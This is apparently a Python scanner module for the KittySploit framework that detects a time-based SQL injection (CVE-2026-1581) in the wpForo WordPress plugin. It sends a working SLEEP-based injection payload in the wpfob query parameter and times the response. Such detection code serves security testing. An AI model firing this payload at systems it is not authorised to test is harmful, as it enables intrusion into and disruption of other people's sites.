#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""wpForo <= 2.4.14 wpfob SQLi (CVE-2026-1581)."""

import time

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress

_PLUGIN = "wpforo"
_VULN_HIGH = (2, 4, 14)


class Module(Scanner, Http_client, Wordpress):
    __info__ = {
        "name": "wpForo CVE-2026-1581 SQLi detect",
        "description": "Time-based SQLi via wpfob query parameter on /community/recent/.",
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": "CVE-2026-1581",
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2026-1581"],
        "modules": ["auxiliary/admin/http/wpforo_cve_2026_1581_sqli"],
        "tags": ["web", "scanner", "wordpress", "wpforo", "sqli", "cve-2026-1581"],
        "agent": {"approval_required": True},
    }

    base_path = OptString("/", "WordPress base path", required=False)
    forum_path = OptString("/community/recent/", "wpForo recent topics path", required=False)
    sleep_seconds = OptInteger(8, "Sleep seconds", required=False)

    def _join(self, suffix: str) -> str:
        base = self.wp_normalize_base_path(self.base_path or "/")
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{base}{suffix}" if base != "/" else suffix

    def run(self):
        version = self.wp_plugin_version(_PLUGIN, self.wp_normalize_base_path(self.base_path or "/")) or ""
        if version and not self.wp_version_in_range(version, (0, 0, 0), _VULN_HIGH):
            return False
        sleep_s = int(self.sleep_seconds or 8)
        path = self._join((self.forum_path or "/community/recent/").strip())
        wpfob = f"(SELECT/**/1/**/FROM/**/(SELECT/**/SLEEP({sleep_s}))a)"
        start = time.monotonic()
        r = self.http_request(
            method="GET",
            path=path,
            params={"wpfob": wpfob},
            allow_redirects=False,
            timeout=sleep_s + 15,
        )
        elapsed = time.monotonic() - start
        if r and r.status_code == 200 and "wpforo-wrap" in (r.text or "") and elapsed >= sleep_s - 1:
            self.set_info(
                severity="critical",
                reason="wpForo CVE-2026-1581 time-based SQLi",
                path=path,
                cve="CVE-2026-1581",
            )
            return True
        return False
